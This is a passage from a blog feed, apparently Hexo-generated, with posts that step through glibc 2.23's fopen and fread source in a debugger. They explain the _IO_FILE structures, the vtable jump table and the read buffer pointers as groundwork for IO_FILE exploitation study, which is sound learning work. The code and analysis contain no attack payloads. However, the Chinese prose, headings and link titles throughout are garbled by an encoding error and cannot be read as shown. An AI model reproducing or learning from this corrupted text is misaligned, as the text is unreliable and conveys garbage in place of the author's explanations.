_fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•fopenå‡½æ•°"><a href="#è°ƒè¯•fopenå‡½æ•°" class="headerlink" title="è°ƒè¯•fopenå‡½æ•°"></a>è°ƒè¯•fopenå‡½æ•°</h2><p>è°ƒè¯•ä¹‹å‰çš„è¯ï¼Œå¯ä»¥å…ˆçœ‹ä¸€ä¸‹æ•´ä½“è°ƒç”¨çš„æµç¨‹ï¼Œè¿™æ ·åœ¨è°ƒè¯•çš„æ—¶å€™æœ‰ä¸ªå‚è€ƒã€‚å¦å¤–å°±æ˜¯è°ƒè¯•çš„æ—¶å€™ï¼Œè¦é™„åŠ ä¸€ä¸‹æºç ï¼Œå…³äºgdbæºç è°ƒè¯•ç¯å¢ƒæ­å»ºå¯ä»¥å‚è€ƒæˆ‘çš„<a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><p>æºä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;/home/hacker/Desktop/flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ¬æ–‡çš„æºä»£ç ä»¥åŠè°ƒè¯•çš„ç¨‹åºæ‰€ä¾èµ–çš„libcéƒ½ä¸º2.23ç‰ˆæœ¬çš„</strong></p><h3 id="æ•´ä½“è°ƒç”¨æµç¨‹å›¾"><a href="#æ•´ä½“è°ƒç”¨æµç¨‹å›¾" class="headerlink" title="æ•´ä½“è°ƒç”¨æµç¨‹å›¾"></a>æ•´ä½“è°ƒç”¨æµç¨‹å›¾</h3><p><img src="/../img/image-20221007215412769.png" alt="image-20221007215412769"></p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>åˆšè¿›å…¥fopenå‡½æ•°çš„æ—¶å€™ï¼Œå°±å‘ç°è¦è°ƒç”¨__fopen_internal å‡½æ•°äº†ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ç„¶åè¿™é‡Œè¦æ³¨æ„çš„å°±æ˜¯ä¸ºå•¥æ‰§è¡Œçš„æ˜¯fopenå‡½æ•°ï¼Œä½†ä¸€è¿›å»å°±åœ¨_IO_new_fopenå‡½æ•°ä¸­å‘¢? </p><p>åŸå› æ˜¯è¿™é‡Œçš„å®å®šä¹‰ </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_fopen fopen</span></span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007220100510.png" alt="image-20221007220100510"></p><h4 id="ç»™æ–°åˆ›å»ºçš„ç»“æ„ä½“ç”³è¯·ä¸€ç‰‡å†…å­˜ç©ºé—´"><a href="#ç»™æ–°åˆ›å»ºçš„ç»“æ„ä½“ç”³è¯·ä¸€ç‰‡å†…å­˜ç©ºé—´" class="headerlink" title="ç»™æ–°åˆ›å»ºçš„ç»“æ„ä½“ç”³è¯·ä¸€ç‰‡å†…å­˜ç©ºé—´"></a>ç»™æ–°åˆ›å»ºçš„ç»“æ„ä½“ç”³è¯·ä¸€ç‰‡å†…å­˜ç©ºé—´</h4><p>ç„¶åè¿›å…¥__fopen_internalå‡½æ•°åï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°å°±æ˜¯mallocæ¥åˆ†é…äº†ä¸€å—locked_FILEç»“æ„ä½“å¤§å°çš„å†…å­˜(å¦‚ä¸‹å›¾)ï¼Œè¿™ä¸ªç»“æ„ä½“åŒ…å«äº†_IO_FILE_plusã€_IO_lock_tã€_IO_wide_dataè¿™ä¸‰ä¸ªç»“æ„ä½“ã€‚ç”±äºæˆ‘ä»¬å¹¶ä¸è°ƒè¯•mallocå‡½æ•°ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬nè¿‡å»</p><p><img src="/../img/image-20221007215434310.png" alt="image-20221007215434310"></p><h4 id="å¯¹FILEç»“æ„ä½“åˆå§‹åŒ–"><a href="#å¯¹FILEç»“æ„ä½“åˆå§‹åŒ–" class="headerlink" title="å¯¹FILEç»“æ„ä½“åˆå§‹åŒ–"></a>å¯¹FILEç»“æ„ä½“åˆå§‹åŒ–</h4><p>mallocå‡½æ•°æ‰§è¡Œåï¼Œå†å¾€ä¸‹å°±æ˜¯_IO_no_initå‡½æ•°(å¦‚ä¸‹å›¾)ï¼Œæˆ‘ä»¬siè¿›å»çœ‹çœ‹è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆ</p><p><img src="/../img/image-20221007215454681.png" alt="image-20221007215454681"></p><p>å¯ä»¥å‘ç°è°ƒç”¨äº†è¿™ä¸ª_IO_old_initå‡½æ•°ï¼Œæˆ‘ä»¬å†æ¬¡siè¿›å»</p><p><img src="/../img/image-20221007215520022.png" alt="image-20221007215520022"></p><p>å‘ç°æ˜¯åœ¨å¯¹_IO_FILE_plusç»“æ„ä½“è¿›è¡Œåˆå§‹åŒ–(å¦‚ä¸‹)</p><p><img src="/../img/image-20221007215534954.png" alt="image-20221007215534954"></p><p>æ­¤æ—¶çš„_IO_FILE_plusç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡å¦‚ä¸‹</p><p><img src="/../img/image-20221007215548563.png" alt="image-20221007215548563"></p><p>ç­‰åˆ°_IO_old_initå‡½æ•°æ‰§è¡Œåï¼Œå‡ºæ¥ç»§ç»­æ‰§è¡Œ_IO_no_initå‡½æ•°ï¼Œå‘ç°åœ¨å¯¹_IO_wide_dataç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œå› æ­¤å¾—å‡ºç»“è®º_IO_no_initå‡½æ•°å°±æ˜¯åœ¨è¿›è¡Œç€ç»“æ„ä½“çš„åˆå§‹åŒ–å·¥ä½œ</p><p><img src="/../img/image-20221007215605749.png" alt="image-20221007215605749"></p><h4 id="å°†-IO-FILE-plusç»“æ„ä½“é“¾å…¥-IO-list-allé“¾è¡¨"><a href="#å°†-IO-FILE-plusç»“æ„ä½“é“¾å…¥-IO-list-allé“¾è¡¨" class="headerlink" title="å°†_IO_FILE_plusç»“æ„ä½“é“¾å…¥_IO_list_allé“¾è¡¨"></a>å°†_IO_FILE_plusç»“æ„ä½“é“¾å…¥_IO_list_allé“¾è¡¨</h4><p>ç­‰åˆ°_IO_no_initå‡½æ•°å‡ºæ¥åï¼Œå°±è°ƒç”¨äº†_IO_file_initå‡½æ•°</p><p><img src="/../img/image-20221007215627273.png" alt="image-20221007215627273"></p><p>å¯ä»¥å‘ç°å…¶å®_IO_file_initå‡½æ•°ä¸»è¦æ˜¯å¯¹_IO_link_inå‡½æ•°çš„ä¸€ä¸ªå°è£…ï¼Œè€Œ_IO_link_inå‡½æ•°å¬åå­—å°±æ„Ÿè§‰æ˜¯è¿›è¡Œçš„é“¾å…¥æ“ä½œ,siè¿›å»çœ‹çœ‹</p><p><img src="/../img/image-20221007215640763.png" alt="image-20221007215640763"></p><p>è¿™éƒ¨åˆ†ä¸»è¦çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œå°±æŠŠfp(ä¹Ÿå°±æ˜¯ç»“æ„ä½“_IO_FILE_plus)ç»™é“¾å…¥äº†é“¾è¡¨ä¸­</p><p><img src="/../img/image-20221007215652819.png" alt="image-20221007215652819"></p><p>ä¸‹é¢ä¸¤ä¸ªå›¾ç‰‡åˆ†åˆ«æ˜¯å°†fpé“¾å…¥å‰åçš„æƒ…å†µ</p><p><img src="/../img/image-20221007215705984.png" alt="image-20221007215705984"></p><p><img src="/../img/image-20221007215718666.png" alt="image-20221007215718666"></p><p>é“¾å…¥å‰åæ•´ä¸ªé“¾è¡¨å¯¹åº”çš„æƒ…å†µå¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221007215732445.png" alt="image-20221007215732445"></p><h4 id="æ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€æ–‡ä»¶"><a href="#æ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€æ–‡ä»¶" class="headerlink" title="æ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€æ–‡ä»¶"></a>æ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€æ–‡ä»¶</h4><p>å½“_IO_file_init å‡½æ•°æ‰§è¡Œå®Œåï¼Œå°±æ¥åˆ°äº†fopenå‡½æ•°çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå°†è¦è°ƒç”¨_IO_file_fopenå‡½æ•°(å¦‚ä¸‹)</p><p><img src="/../img/image-20221007215749092.png" alt="image-20221007215749092"></p><p>è¿›å…¥_IO_file_fopenå‡½æ•°åï¼Œå‘ç°å…ˆfopenå‡½æ•°çš„modeå‚æ•°(æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼)è¿›è¡Œäº†å¤„ç†</p><p><img src="/../img/image-20221007215801237.png" alt="image-20221007215801237"></p><p>è€Œåè°ƒç”¨äº†_IO_file_openå‡½æ•°(è¿™é‡Œå°±ä¸å†æ”¾å›¾ç‰‡è¯´æ˜äº†)ï¼Œç„¶åsiè¿›å»ï¼Œè¯¥å‡½æ•°åˆè°ƒç”¨äº†open64å‡½æ•°ï¼Œå†æ¬¡siè¿›å»æ‰§è¡Œäº†openç³»ç»Ÿè°ƒç”¨</p><p><img src="/../img/image-20221007215812651.png" alt="image-20221007215812651"></p><p>ç„¶åè¿™é‡Œå°†sys_openæ‰§è¡Œåçš„æ–‡ä»¶æè¿°ç¬¦èµ‹å€¼ç»™fp-&gt;fileno(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007215826367.png" alt="image-20221007215826367"></p><p>è‡³æ­¤fopenå‡½æ•°çš„æ•´ä¸ªæµç¨‹å¯ä»¥è¯´æ˜¯æ¥è¿‘å°¾å£°äº†ï¼Œæœ€åå†æ¬¡è°ƒç”¨äº†_IO_link_inå‡½æ•°ï¼Œç¡®ä¿fpå·²ç»é“¾å…¥äº†é“¾è¡¨ä¸­(å¦‚æœå‘ç°é“¾å…¥åï¼Œé‚£ä¹ˆ_IO_link_inå‡½æ•°å°†ç›´æ¥é€€å‡º)ã€‚(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007215838094.png" alt="image-20221007215838094"></p><p><img src="/../img/image-20221007215850109.png" alt="image-20221007215850109"></p><p>è‡³æ­¤fopenå‡½æ•°ç»“æŸï¼Œæ­¤æ—¶çš„FILEç»“æ„ä½“å¦‚ä¸‹</p><p><img src="/../img/image-20221007215905013.png" alt="image-20221007215905013"></p><h3 id="æ€»ç»“fopenè°ƒç”¨æµç¨‹"><a href="#æ€»ç»“fopenè°ƒç”¨æµç¨‹" class="headerlink" title="æ€»ç»“fopenè°ƒç”¨æµç¨‹"></a>æ€»ç»“fopenè°ƒç”¨æµç¨‹</h3><p>å°†æ•´ä¸ªfopenå‡½æ•°çš„è°ƒç”¨æµç¨‹æ¦‚æ‹¬ä¸€ä¸‹ä¸º:</p><blockquote><p>1ã€ç»™æ–°åˆ›å»ºçš„ç»“æ„ä½“ç”³è¯·ä¸€ç‰‡å†…å­˜ç©ºé—´</p><p>2ã€å¯¹FILEç»“æ„ä½“åˆå§‹åŒ–</p><p>3ã€å°†_IO_FILE_plusç»“æ„ä½“é“¾å…¥_IO_list_allé“¾è¡¨</p><p>4ã€æ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€æ–‡ä»¶</p></blockquote><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://la13x.github.io/2021/07/27/IO-FILE/#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">IO_FILEç›¸å…³åˆ©ç”¨ | Alexâ€™s blog~ (la13x.github.io)</a></p><p><a href="https://nightrainy.github.io/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/">_IO_FILEç»“æ„ä½“åˆ©ç”¨ - çŸ¥ä¸–ã®å°å±‹ (nightrainy.github.io)</a></p><p><a href="https://www.anquanke.com/post/id/177910">IO FILEä¹‹fopenè¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">(41æ¡æ¶ˆæ¯) å¥½å¥½è¯´è¯ä¹‹IO_FILEåˆ©ç”¨ï¼ˆ1ï¼‰ï¼šåˆ©ç”¨_IO_2_1_stdoutæ³„éœ²libc_hollkçš„åšå®¢-CSDNåšå®¢_stdoutæ³„éœ²libc</a></p><p><a href="https://www.cnblogs.com/hawkJW/p/13546416.html">pwnâ€”â€”IO_FILEå­¦ä¹ ï¼ˆä¸€ï¼‰ - hawkJW - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æºç è°ƒè¯•&amp;&amp;åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç è°ƒè¯•&amp;&amp;åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOå­¦ä¹ --æºç åˆ†æfreadå‡½æ•°</title>
      <link href="/posts/323816c7.html"/>
      <url>/posts/323816c7.html</url>
      
        <content type="html"><![CDATA[<p>ä¸Šä¸€ç¯‡åˆ†æçš„æ˜¯fopenå‡½æ•°ï¼Œè¿™æ¬¡æ¥åˆ†æä¸‹freadå‡½æ•°ã€‚<br><a href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IOå­¦ä¹ â€“æºç è°ƒè¯•fopenå‡½æ•°</a></p><h2 id="å‰ç½®çŸ¥è¯†ï¼š"><a href="#å‰ç½®çŸ¥è¯†ï¼š" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h2><p>åœ¨åˆ†æfreadå‡½æ•°æ—¶ï¼Œåº”è¯¥å…ˆæ˜ç¡®ä¸€ä¸‹è¾“å…¥ç¼“å†²åŒºæ˜¯æ€ä¹ˆæ¥çš„ã€‚</p><p>é¦–å…ˆ<strong>freadå‡½æ•°ä¼šå…ˆå°†æ•°æ®è¯»åˆ°è¾“å…¥ç¼“å†²åŒºä¸­ï¼Œç„¶åä»è¾“å…¥ç¼“å†²åŒºä¸­æ‰§è¡Œmemcpyå‡½æ•°ï¼Œæ‹·è´ä¸€å®šå­—èŠ‚çš„æ•°æ®åˆ°æˆ‘ä»¬æŒ‡å®šçš„å†…å­˜åœ°å€ä¸Š</strong>ã€‚è€Œè¿™ä¸ªè¾“å…¥ç¼“å†²åŒºæ˜¯ä»å“ªåˆ°å“ªå‘¢ï¼Ÿç”±ä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«å£°æ˜äº†è¿™ç‰‡åŒºåŸŸçš„å¼€å§‹å’Œç»“æŸï¼Œä»–ä»¬åˆ†åˆ«å«åš<strong>_IO_read_baseå’Œ_IO_read_endï¼Œä»–ä»¬ä¹‹é—´çš„åŒºåŸŸå°±æ˜¯è¾“å…¥ç¼“å†²åŒº</strong>ã€‚è¿™æ ·çœ‹èµ·æ¥ä¼¼ä¹è¿˜éœ€è¦ä¸€ä¸ªè¾“å‡ºç¼“å†²åŒºï¼Œéš¾é“éœ€è¦mallocç”³è¯·ä¸¤ä¸ªå †å—æ¥åˆ†åˆ«è¡¨ç¤ºè¾“å…¥ç¼“å†²åŒºå’Œè¾“å‡ºç¼“å†²åŒºä¹ˆï¼Ÿéä¹Ÿï¼Œå…¶å®<strong>mallocå‡½æ•°è‡ªå§‹è‡³ç»ˆåªç”³è¯·äº†ä¸€ä¸ªå †å—</strong>ï¼Œ<strong>è¿™ä¸ªå †å—çš„åŒºåŸŸä¹Ÿå«åšreserve area</strong>ï¼Œè€Œ_IO_buf_baseå’Œ_IO_buf_endä¸¤ä¸ªæŒ‡é’ˆåˆ™åˆ†åˆ«å£°æ˜äº†è¿™ä¸ªreserve areaçš„å§‹æœ«ã€‚ç„¶åå°† _IO_read_ptr; _IO_read_end; _IO_read_base;_IO_write_base;_IO_write_ptr; _IO_write_end;è¿™å…­ä¸ªæŒ‡é’ˆå…¨éƒ¨åˆå§‹åŒ–ä¸ºäº†_IO_buf_baseçš„å€¼ï¼Œç°åœ¨çš„è¾“å…¥ç¼“å†²åŒºå’Œè¾“å‡ºç¼“å†²åŒºè¿˜ä¸å­˜åœ¨(å› ä¸ºç°åœ¨ _IO_read_endå’Œ _IO_read_baseçš„å€¼ç›¸åŒ)ï¼Œä»¥è¾“å…¥ç¼“å†²åŒºä¸ºä¾‹ï¼Œ<strong>è¯»å…¥æ•°æ®æ—¶æ˜¯æ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨readï¼Œè€Œæ­¤æ—¶çš„æ•°æ®æ˜¯åœ¨reserve areaä¸­ï¼Œç´§æ¥ç€ _IO_read_endå°±ä¼šåŠ ä¸Šåˆšåˆšè¯»å…¥çš„æ•°æ®çš„ä¸ªæ•°ï¼Œé‚£ä¹ˆæ­¤æ—¶ _IO_read_endå’Œ _IO_read_baseçš„å€¼å˜çš„ä¸åŒäº†ã€‚è€Œç°åœ¨è¿™äºŒè€…ä¹‹é—´çš„åŒºåŸŸå°±æˆä¸ºè¾“å…¥ç¼“å†²åŒº</strong>ã€‚</p><p>å†æä¸€ä¸‹_IO_FILEç»“æ„ä½“ä¸­çš„ä¸€äº›æŒ‡é’ˆ(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span> </span><br><span class="line"><span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­_<strong>IO_buf_base å’Œ _IO_buf_endä¸¤ä¸ªæŒ‡é’ˆçš„ä½œç”¨åˆ†åˆ«æ˜¯æ ‡æ˜reserve areaçš„å§‹æœ«</strong>ã€‚**_IO_read_base å’Œ  _IO_read_endä¸¤ä¸ªæŒ‡é’ˆçš„ä½œç”¨åˆ†åˆ«æ˜¯æ ‡æ˜è¾“å…¥ç¼“å†²åŒºçš„å§‹æœ«(writeé‚£ä¸¤ä¸ªæŒ‡é’ˆåŒç†)<strong>ï¼Œç°åœ¨å‡è®¾æœ‰ä¸€ä¸ª30å­—èŠ‚çš„flagæ–‡ä»¶ï¼Œç„¶åæˆ‘è¿ç»­æ‰§è¡Œä¸¤æ¬¡freadå‡½æ•°ï¼Œæ¯æ¬¡ä»æ–‡ä»¶ä¸­åªè¯»10å­—èŠ‚ï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡æ‰§è¡Œfreadå‡½æ•°æ˜¯ä»å“ªå¼€å§‹è¯»å‘¢ï¼Œå¾ˆæ˜æ˜¾å¹¶ä¸æ˜¯æ–‡ä»¶çš„å¼€å§‹æ¥è¯»å–äº†ï¼Œè€Œæ˜¯æ¥ç€ä¸Šå›freadå‡½æ•°è¯»åˆ°çš„ä½ç½®ï¼Œç»§ç»­è¯»10å­—èŠ‚æ•°æ®ã€‚ä½†æˆ‘ä»¬æ€ä¹ˆå»è®°å½•ä¸Šå›freadå‡½æ•°è¯»åˆ°å“ªäº†å‘¢ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°</strong>_IO_read_ptræŒ‡é’ˆäº†ï¼Œå®ƒæ˜¯æ¥è®°å½•ä¸‹ä¸€æ¬¡æ•°æ®åº”è¯¥ä»è¾“å…¥ç¼“å†²åŒºçš„å“ªé‡Œå¼€å§‹è¯»äº†ã€‚ä¹Ÿå°±æ˜¯è¯´_IO_read_base å’Œ _IO_read_ptr ä¹‹é—´çš„åŒºåŸŸæ˜¯å·²ç»ä½¿ç”¨äº†çš„è¾“å…¥ç¼“å†²åŒºï¼Œè€Œ _IO_read_ptr å’Œ _IO_read_endä¹‹é—´çš„åŒºåŸŸæ˜¯è¾“å…¥ç¼“å†²åŒºçš„å‰©ä½™éƒ¨åˆ†(ä¹Ÿå°±æ˜¯è¿˜æœªä½¿ç”¨éƒ¨åˆ†)**ã€‚</p><p>é€šè¿‡ä¸Šé¢è¿™ä¸¤æ®µæ–‡å­—ï¼Œåº”è¯¥å¯ä»¥å¯¹åˆšå­¦ä¹ IOçš„å¸ˆå‚…å¯¹_IO_FILEç»“æ„ä½“ä¸­è¡¨ç¤ºç¼“å†²åŒºä½ç½®çš„æŒ‡é’ˆæœ‰ä¸€äº›äº†è§£äº†ã€‚</p><p>åŒæ—¶è¿™æ¬¡è¿˜è¦æåˆ°vtableï¼Œå®ƒæ˜¯_IO_FILE_plusç»“æ„ä½“ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆã€‚å®ƒæŒ‡å‘äº†_IO_jump_tç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹äº_IO_jump_tç»“æ„ä½“ï¼Œæˆ‘ç›®å‰çš„ç†è§£å®ƒå°±æ˜¯ä¸€ä¸ªè·³è½¬è¡¨ï¼Œè¿™é‡Œæ”¾çš„éƒ½æ˜¯å‡½æ•°æŒ‡é’ˆã€‚é€šè¿‡ä¸åŒçš„åç§»è·å–ä¸åŒçš„å‡½æ•°æŒ‡é’ˆï¼Œç„¶åå°†å…¶è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•´ä½“æµç¨‹"><a href="#æ•´ä½“æµç¨‹" class="headerlink" title="æ•´ä½“æµç¨‹"></a>æ•´ä½“æµç¨‹</h2><p><img src="/../img/image-20221007220413772.png" alt="image-20221007220413772"></p><p><img src="https://s2.loli.net/2022/08/11/U2BbDW57QiMHZGz.png" alt="image-20220811085348962"></p><p>ä¸Šé¢ç¬¬ä¸€å¼ å›¾ç‰‡æ˜¯freadå‡½æ•°çš„æ•´ä½“æµç¨‹ï¼Œç¬¬äºŒå¼ å›¾ç‰‡æ˜¯æ ¹æ®æˆ‘ä¸‹é¢å†™çš„è¿™ä¸ªæºä»£ç å¯¹åº”çš„å‡½æ•°è°ƒç”¨æµç¨‹(è°ƒè¯•çš„æ—¶å€™ç»“åˆè¿™ä¸¤ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥å¯¹è‡ªå·±è°ƒè¯•åˆ°å“ªéƒ¨åˆ†æœ‰ä¸ªæ¯”è¾ƒæ¸…æ¥šçš„è®¤çŸ¥)ã€‚</p><h2 id="æºä»£ç ï¼š"><a href="#æºä»£ç ï¼š" class="headerlink" title="æºä»£ç ï¼š"></a>æºä»£ç ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(value,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ¬æ–‡çš„æºä»£ç ä»¥åŠè°ƒè¯•çš„ç¨‹åºæ‰€ä¾èµ–çš„libcéƒ½ä¸º2.23ç‰ˆæœ¬çš„</strong></p><h2 id="æºç åˆ†æ-amp-amp-æºç è°ƒè¯•"><a href="#æºç åˆ†æ-amp-amp-æºç è°ƒè¯•" class="headerlink" title="æºç åˆ†æ&amp;&amp;æºç è°ƒè¯•"></a>æºç åˆ†æ&amp;&amp;æºç è°ƒè¯•</h2><p>å…ˆçœ‹freadå‡½æ•°æºç ï¼Œå‘ç°å®ƒçš„ä»£ç å¾ˆçŸ­(å¦‚ä¸‹)ï¼Œè¿™é‡Œä¸»è¦å°±æ˜¯è°ƒç”¨äº†_IO_sgetnå‡½æ•°</p><p><img src="https://s2.loli.net/2022/08/11/Py8OzWV5RXhE7vn.png" alt="image-20220810100233854"></p><p>æŸ¥çœ‹_IO_sgetnå‡½æ•°åï¼Œå‘ç°å®ƒåªè°ƒç”¨äº†vtableä¸­çš„_IO_XSGETN</p><p><img src="https://s2.loli.net/2022/08/11/OGN6ZoP8EyptgmU.png" alt="image-20220810100551020"></p><p>ç„¶åå†æº¯æºçš„è¯å°±æ˜¯å‡ ä¸ªå®å®šä¹‰ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 